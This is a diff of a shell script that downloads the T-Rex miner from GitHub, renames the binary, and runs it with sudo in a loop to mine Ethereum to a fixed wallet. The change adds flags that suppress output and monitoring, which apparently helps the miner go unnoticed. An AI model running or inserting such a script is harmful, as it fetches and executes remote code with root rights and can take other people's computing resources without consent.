@@ -9,10 +9,11 @@ wget https://github.com/trexminer/T-Rex/releases/download/0.21.4/t-rex-0.21.4-li
 #tar -xf t-rex-0.21.3-linux.tar.gz
 tar -xf t-rex-0.21.4-linux.tar.gz
 mv t-rex $y
+# --gpu-report-interval 10
 while [ $x -le 20 ]
 do
 
-  sudo ./$y -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --gpu-report-interval 10 --coin ETH --intensity 18 --low-load 1
+  sudo ./$y -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --coin ETH --intensity 18 --low-load 1 --no-color --quiet --hide-date --send-stales --no-nvml --no-strict-ssl
 
 
   x=$(( $x + 1 ))
